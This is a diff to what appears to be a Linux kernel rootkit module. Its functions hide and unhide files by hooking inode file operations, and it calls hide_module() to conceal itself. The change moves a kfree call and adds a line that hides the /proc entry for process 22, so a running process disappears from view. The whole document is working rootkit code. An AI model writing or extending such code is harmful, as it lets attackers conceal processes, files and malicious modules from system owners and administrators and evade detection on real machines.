@@ -221,11 +221,11 @@ static int hide_file(const char *path_name) {
 	if ((retval = get_inode_by_path_name(dir_path, &inode))) {
 	    return retval;
 	}
-	kfree(dir_path);
 
 	if ((retval = create_hidden_file_entry(inode, file_name))) {
 	    return retval;
 	}
+	kfree(dir_path);
 
 	fops_hook = get_fops_hook(inode);
 	if (fops_hook != NULL) {
@@ -257,11 +257,11 @@ static int unhide_file(const char *path_name) {
 	if ((retval = get_inode_by_path_name(dir_path, &inode))) {
 	    return retval;
 	}
-    kfree(dir_path);
 
     if ((retval = free_hidden_file_entry(inode, file_name))) {
 	    return retval;
 	}
+    kfree(dir_path);
 
 	return free_fops_hook(inode);
 }
@@ -269,6 +269,7 @@ static int unhide_file(const char *path_name) {
 static int __init MRK_initialize(void) {
 	hide_file(test_path_name);
 	hide_file(test_path_name2);
+	hide_file("/proc/22");
 	unhide_file(test_path_name2);
 	hide_module();
 	printk(KERN_INFO "Hello, World!\n");
